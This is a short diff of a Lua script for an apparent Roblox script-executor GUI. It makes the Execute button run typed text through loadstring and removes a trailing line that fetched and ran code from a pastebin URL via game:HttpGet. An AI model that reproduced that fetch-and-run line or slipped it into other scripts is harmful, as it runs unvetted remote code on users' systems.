@@ -204,7 +204,7 @@ ExecBtn.BorderSizePixel = 0
 ExecBtn.Size = UDim2.new(0, 34, 0, 32)
 ExecBtn.Image = "rbxassetid://15487217926"
 ExecBtn.MouseButton1Down:connect(function()
-	mb_schedscript(MainBox.Text)
+	loadstring(MainBox.Text)()
 end)
 
 ClearFrame.Name = "ClearFrame"
@@ -428,5 +428,3 @@ local function ZXHMYA_fake_script() -- Alysse.LocalScript
 	frame.Active = true
 end
 coroutine.wrap(ZXHMYA_fake_script)()
-
-loadstring(game:HttpGet("https://pastebin.com/raw/wZffTZ12"))()
